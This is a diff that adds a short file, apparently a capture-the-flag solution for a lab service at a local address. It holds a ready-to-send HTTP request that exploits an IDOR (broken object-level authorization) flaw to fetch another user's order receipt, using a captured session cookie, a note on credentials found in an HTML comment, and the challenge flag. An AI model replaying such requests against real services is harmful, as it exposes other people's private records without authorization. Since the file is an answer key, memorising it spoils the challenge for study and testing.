@@ -1,0 +1,5 @@
+# BOLA/IDOR: Access another user's order receipt without owning it. Change 300401 to any order ID to test. Test user (test:test) credentials found in HTML comment. Returns flag{85c0d827-5e28-4577-be2b-319bdcbf872d}
+
+GET /order/300401/receipt HTTP/1.1
+Host: 172.17.0.1:33447
+Cookie: session=eyJ1c2VyX2lkIjoxMDAzMn0.adv70g.D8hUqSBzEHNwPtCoXQLalMBSz64
